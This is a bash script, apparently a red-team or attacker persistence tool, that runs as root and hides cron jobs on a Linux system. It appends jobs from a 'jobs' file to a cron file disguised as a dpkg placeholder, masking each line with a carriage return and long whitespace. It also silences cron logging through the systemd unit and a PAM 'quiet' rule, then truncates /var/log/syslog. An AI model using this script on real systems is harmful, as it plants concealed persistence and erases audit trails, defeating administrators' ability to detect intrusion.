#/bin/bash
# DESCRIPTION: Creates and masks cronjobs

if [[ $(/usr/bin/id -u) -ne 0 ]]; then
    echo "Script must be run as root"
    exit
fi

file="jobs"

echo "=== Adding silenced cronjobs from the $file file ==="

mkdir -p /etc/cron.d 2> /dev/null
rm /etc/cron.d/.placeholder 2> /dev/null
rm /etc/cron.d/placeholder 2> /dev/null
touch /etc/cron.d/placeholder

echo "# DO NOT EDIT OR REMOVE" >> /etc/cron.d/placeholder
echo "# This file is a simple placeholder to keep dpkg from removing this directory" >> /etc/cron.d/placeholder


while read -r line; do
    echo "$line > /dev/null #\r                                                                                   " >> /etc/cron.d/placeholder
done <$file

echo "Jobs written to /etc/cron.d/placeholder"

echo "\nContents of /etc/cron.d/placeholder:"
cat /etc/cron.d/placeholder

echo "\n\n=== Silencing cron logs and restarting service ==="

SERVICEFILE="/lib/systemd/system/cron.service"
match="ExecStart=/usr/sbin/cron -f -P -L 0"
SILENCE="-L 0"

if grep -Fxq "$match" $SERVICEFILE
then
    echo "Silencing already found in $SERVICEFILE"
else
    echo "Adding silencing to $SERVICEFILE"
    sed -i '/ExecStart/ s/$/ -L 0/' $SERVICEFILE
fi

# Add feature to cp cron.service over as it removes log level to 0
# set pam auth to remove messages from cron log
SILENCE="session     [success=1 default=ignore] pam_succeed_if.so service in cron quiet use_uid"
PAMFILE="/etc/pam.d/common-session-noninteractive"
match="# and here are more per-package modules (the \"Additional\" block)"

if grep -Fxq "$SILENCE" $PAMFILE
then
    echo "Silencing already found in $PAMFILE"
else
    echo "Adding silencing to $PAMFILE"
    sed -i "/$match/a$SILENCE" $PAMFILE
fi

echo "Reloading systemctl daemon and restarting cron..."

systemctl daemon-reload
systemctl restart cron

echo "Clearing logs"

truncate -s 0 /var/log/syslog